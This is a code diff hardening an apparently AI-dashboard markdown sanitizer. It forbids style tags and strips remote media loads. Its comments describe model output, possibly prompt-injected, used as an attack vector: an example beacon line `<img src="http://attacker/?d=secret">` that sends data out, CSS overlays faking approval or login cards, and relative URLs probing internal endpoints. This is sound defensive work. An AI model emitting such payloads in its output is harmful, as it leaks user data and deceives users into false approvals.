@@ -29,11 +29,114 @@ export function escapeHtml(s: string): string {
 /**
  * HTML 片段消毒（渲染闸与皮肤引擎 data-nb-html 共用的单一配置真相源）。
  * DOMPurify 默认净化活动内容（script / on* 事件属性 / javascript: URI）；
- * style 属性整体禁掉——模型/皮肤内容不需要内联样式，禁掉即消灭整类 CSS
- * 注入向量（DOMPurify 默认只净化不剥除）。对已消毒 HTML 幂等。
+ * style 属性整体禁掉，`<style>` 标签同样显式禁掉——DOMPurify 默认白名单
+ * **放行** `<style>` 元素（BUG-20261113-154：FORBID_ATTR 只禁属性禁不了
+ * 标签），模型输出混入的样式块会原样进 DOM，构成页面级 CSS defacement
+ * （position:fixed 全屏覆盖层可伪装审批卡/登录框）与 CSS 选择器外传向量。
+ * 模型/皮肤内容不需要内联样式与样式块，属性+标签双禁即消灭整类 CSS
+ * 注入向量。对已消毒 HTML 幂等。
  */
 export function sanitizeHtmlFragment(html: string): string {
-  return DOMPurify.sanitize(html, { FORBID_ATTR: ['style'] })
+  return DOMPurify.sanitize(html, {
+    FORBID_ATTR: ['style'],
+    FORBID_TAGS: ['style'],
+  })
+}
+
+// ---------------------------------------------------------------------------
+// 远程媒体剥离（BUG-20261115-033）：DOMPurify 默认白名单**放行** img/video/
+// audio 的远程 http(s) 与同源相对 src——模型输出（或被注入后的输出）混入
+// `<img src="http://attacker/?d=secret">` 在 Dashboard 渲染即静默外呼（信标/
+// 外传向量，无需任何工具审批；与 BUG-20261113-154 的 CSS 向量同款信任模型）。
+// 同源相对路径虽不出网，但可探达 gateway GET 端点（如 /api/internal 急停）。
+// 仅放行 data:image/*（内联图零网络请求；皮肤引擎 ALLOWED_DATA_URLS 同款
+// 契约）。共享消毒配置 sanitizeHtmlFragment 不动（皮肤引擎 data-nb-html
+// 同源消费，全局禁 img 会断皮肤内联图标）——本剥离只收窄 markdown 渲染
+// 管线：聊天图片走 upload→media 附件路径不经 markdown，gateway 无 workspace
+// 图片静态路由，远程/相对媒体在 markdown 里无既有消费场景。
+// ---------------------------------------------------------------------------
+
+/// 媒体元素：img 主源 + video/audio 容器 + source/track 子源（picture 内
+/// source 的 srcset 同样触发网络请求，被同一选择器覆盖）。
+const MEDIA_SELECTOR = 'img,video,audio,source,track'
+
+/// 安全媒体 URL：仅内联 data:image/*（SVG 在 img 上下文按规范脚本惰性；
+/// 是否存活以 DOMPurify 自身 data-URI 策略为准——本剥离只做增量收紧）。
+const SAFE_MEDIA_URL_RE = /^data:image\//
+
+function mediaUrlSafe(url: string): boolean {
+  return SAFE_MEDIA_URL_RE.test(url.trim())
+}
+
+/// srcset 逐候选解析（WHATWG「parse a srcset attribute」语义）：URL 是非
+/// 空白连续段——段内逗号**保留**（`data:...;base64,PAYLOAD` 的载荷逗号不是
+/// 候选分隔符，朴素 split(',') 会把载荷拦腰截断），仅段尾逗号属分隔符
+/// （`url1,url2` 简写形态）剥掉；URL 后跟可选描述符段（非空白非逗号，
+/// 1x/2x/100w）。合法候选原样重建，全不安全返回 null（调用方摘除属性）。
+function filterSrcset(value: string): string | null {
+  const kept: string[] = []
+  let i = 0
+  const n = value.length
+  while (i < n) {
+    // 分隔带：空白与逗号。
+    while (i < n && (value[i] === ',' || /\s/.test(value[i]))) i++
+    if (i >= n) break
+    // URL：非空白连续段，段内逗号保留，段尾逗号剥离。
+    const start = i
+    while (i < n && !/\s/.test(value[i])) i++
+    let url = value.slice(start, i)
+    if (url.endsWith(',')) url = url.replace(/,+$/, '')
+    // 描述符：非空白非逗号连续段（可空——纯逗号分隔形态无描述符）。
+    const dStart = i
+    while (i < n && !/[\s,]/.test(value[i])) i++
+    const desc = value.slice(dStart, i)
+    if (mediaUrlSafe(url)) kept.push(desc ? `${url} ${desc}` : url)
+  }
+  return kept.length > 0 ? kept.join(', ') : null
+}
+
+/**
+ * 从消毒后 HTML 剥离会发起网络请求的媒体加载（sanitize 之后、v-html 之前）。
+ * 规则：src 不安全 → 移除元素；src 安全/缺省时逐候选过滤 srcset，poster
+ * 不安全仅摘属性；img/source/track 无可用源即死元素移除；video/audio 子源
+ * 全部失效时连容器一并移除。逆文档序处理（子先于父）保证容器移除判定看到
+ * 子源处理后的最终形态。对无媒体 HTML 幂等直通。
+ */
+function stripRemoteMedia(html: string): string {
+  if (!/<(?:img|video|audio|source|track)[\s>]/i.test(html)) return html
+  const holder = document.createElement('div')
+  holder.innerHTML = html // 已过 DOMPurify，安全
+  const els = Array.from(holder.querySelectorAll(MEDIA_SELECTOR)).reverse()
+  for (const el of els) {
+    let hasSource = false
+    const src = el.getAttribute('src')
+    if (src !== null) {
+      if (!mediaUrlSafe(src)) {
+        el.remove()
+        continue
+      }
+      hasSource = true
+    }
+    const srcset = el.getAttribute('srcset')
+    if (srcset !== null) {
+      const kept = filterSrcset(srcset)
+      if (kept === null) el.removeAttribute('srcset')
+      else {
+        el.setAttribute('srcset', kept)
+        hasSource = true
+      }
+    }
+    const poster = el.getAttribute('poster')
+    if (poster !== null && !mediaUrlSafe(poster)) el.removeAttribute('poster')
+    if (el.tagName === 'VIDEO' || el.tagName === 'AUDIO') {
+      // 子源已在逆序前轮处理完：幸存的 source 即合法源。
+      if (!hasSource && !el.querySelector('source')) el.remove()
+    } else if (!hasSource) {
+      // img/source/track：无可用主源即死元素，移除。
+      el.remove()
+    }
+  }
+  return holder.innerHTML
 }
 
 export function renderMarkdownHtml(text: string, opts?: MarkdownRenderOptions): string {
@@ -48,8 +151,9 @@ export function renderMarkdownHtml(text: string, opts?: MarkdownRenderOptions): 
   // <script>/<img onerror> 会被当真渲染。此处是全部 v-html 渲染面的
   // 唯一消毒闸（2026-09-26 复检挂账高优 Canvas-#2）；hljs 高亮是消毒后
   // 的 DOM 事后增强，不受影响。消毒配置单一真相源见 sanitizeHtmlFragment
-  // （皮肤引擎 data-nb-html 同源消费）。
-  const html = sanitizeHtmlFragment(raw)
+  // （皮肤引擎 data-nb-html 同源消费）；stripRemoteMedia 是消毒后的第二道
+  // 增量收窄（远程/相对媒体加载剥离，仅 markdown 管线，BUG-20261115-033）。
+  const html = stripRemoteMedia(sanitizeHtmlFragment(raw))
   // marked 输出的表格标签无属性、形态稳定——就地包装为滚动容器。
   const linked = linkifyFilePaths(html)
   return linked
